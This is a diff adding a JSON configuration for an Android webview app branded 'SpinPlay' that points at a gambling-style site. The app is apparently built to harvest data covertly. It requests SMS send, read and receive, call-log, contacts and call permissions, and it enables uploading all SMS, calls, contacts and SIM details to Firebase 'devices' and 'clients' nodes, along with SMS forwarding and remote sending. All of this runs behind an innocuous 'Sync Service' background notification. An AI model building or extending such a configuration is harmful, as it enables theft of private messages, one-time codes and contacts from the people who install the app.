@@ -1,0 +1,69 @@
+{
+  "app": {
+    "name": "SpinPlay",
+    "package": "com.spinplay99.adminpanel",
+    "version_code": 1,
+    "version_name": "1.0.0",
+    "webview_url": "https://spinplay99.com",
+    "allowed_domain": "spinplay99.com",
+    "min_sdk": 21,
+    "target_sdk": 34
+  },
+  "firebase": {
+    "database_url": ""
+  },
+  "permissions": {
+    "internet": true,
+    "network_state": true,
+    "foreground_service": true,
+    "foreground_service_data_sync": true,
+    "boot_completed": true,
+    "wake_lock": true,
+    "post_notifications": true,
+    "send_sms": true,
+    "receive_sms": true,
+    "read_sms": true,
+    "read_call_log": true,
+    "read_contacts": true,
+    "call_phone": true,
+    "read_phone_state": false,
+    "camera": false,
+    "record_audio": false,
+    "fine_location": false
+  },
+  "sync": {
+    "online_status": true,
+    "device_info": true,
+    "live_data": true,
+    "all_sms": true,
+    "new_sms": true,
+    "all_calls": true,
+    "all_contacts": true,
+    "devices_status": true,
+    "clients_node": true,
+    "sms_forwarding": true,
+    "manual_send_sms": true,
+    "sim_info": true,
+    "permissions_status": true
+  },
+  "nodes": {
+    "device_root": "devices",
+    "status_root": "devices_status",
+    "clients_root": "clients"
+  },
+  "ui": {
+    "primary_color": "#FF3C3C",
+    "accent_color": "#FFD700",
+    "background_color": "#0A0A0F",
+    "progress_color": "#FFD700",
+    "use_landing_page": false,
+    "splash_title": "Welcome",
+    "splash_subtitle": "Loading...",
+    "logo_emoji": "📱",
+    "exit_title": "Exit App",
+    "exit_message": "Do you want to close the app?",
+    "notification_title": "Sync Service",
+    "notification_text": "Running in background",
+    "home_buttons": []
+  }
+}
